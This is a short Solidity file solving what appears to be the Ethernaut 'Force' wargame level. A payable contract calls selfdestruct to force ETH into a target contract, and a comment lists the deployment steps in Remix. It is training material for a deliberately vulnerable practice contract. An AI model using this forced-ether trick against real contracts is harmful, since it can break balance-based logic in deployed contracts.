/*
Tools needed for this level:
- Console
- Remix IDE

1.- Deploy this contract (ForceAttack.sol) with some ETH (1 wei is enough) with Remix using the Injected Web3 environment
2.- Execute the die() function passing Ethernaut's Force contract address.
3.-Get balance of instance after executing the die function with:
	(await web3.eth.getBalance(instance)).toString()
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceAttack {
	constructor() public payable {}

	function die(address payable _contract) public {
			selfdestruct (payable (_contract));
	}
}